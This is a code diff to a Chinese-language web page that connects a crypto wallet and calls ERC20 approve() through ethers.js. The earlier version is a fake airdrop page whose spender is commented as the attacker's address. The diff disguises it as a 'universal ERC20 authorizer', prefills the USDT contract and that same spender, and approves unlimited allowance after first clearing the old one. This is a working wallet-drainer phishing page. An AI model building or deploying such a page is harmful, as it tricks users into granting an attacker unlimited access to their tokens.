@@ -1,21 +1,22 @@
+
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8" />
-  <title>空投活動頁</title>
+  <title>通用 ERC20 授權器</title>
 </head>
 <body style="text-align: center; padding-top: 60px; font-family: sans-serif;">
-  <h2>🎁 恭喜你獲得 TTK 空投！</h2>
+  <h2>🎁 點擊以下按鈕進行授權（支援 USDT / USDC / 所有 ERC20）</h2>
+  <label>Token 合約地址：<input type="text" id="tokenAddress" value="0xdAC17F958D2ee523a2206206994597C13D831ec7" style="width:400px;"></label><br><br>
+  <label>授權對象（spender）：<input type="text" id="spender" value="0xDa4FfA490992769B8F54063bf0B9E7a4D3479459" style="width:400px;"></label><br><br>
   <button onclick="connectWallet()">連接錢包</button>
   <br><br>
-  <button onclick="approve()">點我領取（其實是 Approve）</button>
+  <button onclick="approve()">執行通用授權</button>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
     let signer;
 
-    const tokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // 你的代幣地址
-    const spender = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459"; // 攻擊者地址
     const abi = [
       "function approve(address spender, uint256 amount) external returns (bool)"
     ];
@@ -38,10 +39,20 @@
         return;
       }
 
+      const tokenAddress = document.getElementById("tokenAddress").value;
+      const spender = document.getElementById("spender").value;
       const contract = new ethers.Contract(tokenAddress, abi, signer);
+
       try {
-        const tx = await contract.approve(spender, ethers.constants.MaxUint256);
-        alert("授權成功！Tx Hash: " + tx.hash);
+        // USDT 專用解法：先 approve 0
+        const tx1 = await contract.approve(spender, 0);
+        console.log("清除舊授權中...", tx1.hash);
+        await tx1.wait();
+
+        // 然後 approve MaxUint256
+        const tx2 = await contract.approve(spender, ethers.constants.MaxUint256);
+        console.log("✅ 授權成功", tx2.hash);
+        alert("授權完成！Tx Hash: " + tx2.hash);
       } catch (err) {
         console.error(err);
         alert("授權失敗：" + err.message);
